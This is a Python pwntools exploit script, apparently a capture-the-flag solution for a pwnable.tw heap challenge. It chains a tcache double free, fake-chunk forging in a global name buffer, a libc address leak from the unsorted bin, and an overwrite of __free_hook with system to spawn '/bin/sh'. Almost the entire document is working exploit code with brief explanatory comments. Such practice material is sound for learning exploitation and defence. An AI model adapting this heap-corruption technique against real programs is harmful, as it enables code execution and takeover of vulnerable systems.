from pwn import *
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("-d", action="store_true")
args = parser.parse_args()

PROG = './chal'
libc = ELF('./libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so')

def start():
    return gdb.debug(PROG, db) if args.d else process(PROG) 

### ------------------ EXPLOIT ------------------ ###

r = remote('chall.pwnable.tw', 10207)

def malloc(size, data):
    r.sendlineafter(b'choice :', b'1')
    r.sendlineafter(b'Size:', str(size).encode('utf-8'))
    r.sendafter(b'Data:', data)

def free():
    r.sendlineafter(b'choice :', b'2')

def info():
    r.sendlineafter(b'choice :', b'3')

NAME_BUF = 0x602060
NEXT_CHUNK_SIZE = 0x602568 - 8

r.sendlineafter(b'Name:', p64(0) + p64(0x501))

# double free to write over fd pointer - tcache vuln
malloc(0x1, b'AAAA')
free()
free()
malloc(0x1, p64(NAME_BUF + 0x10))
malloc(0x1, b'hi')

# writing over name buffer
# must create 2 fake chunks to bypass checks
malloc(0x1, (p64(0) * 3) + p64(NAME_BUF + 0x10) + (b'\x00' * (0x500 - 40)) + p64(0x11) + (b'A' * 0x10) + p64(0x11))
free()

# in unsorted bin (doubly linked), will show main arena address in libc
info()
r.recvuntil(b'Name :')
r.recv(16)
main_arena = unpack(r.recv(8), 64, endian='little')
log.info('Main arena addr: ' + hex(main_arena))
libc.address = main_arena - 0x3ebca0
log.info('Libc base: ' + hex(libc.address))

FREE_HOOK = libc.sym['__free_hook']
SYSTEM = libc.sym['system']

# overwrite __free_hook -> system
malloc(0x41, b'BBBB')
free()
free()
malloc(0x41, p64(FREE_HOOK))
malloc(0x41, b'hi')
malloc(0x41, p64(SYSTEM))

malloc(0x50, b'/bin/sh')
free()

r.interactive()
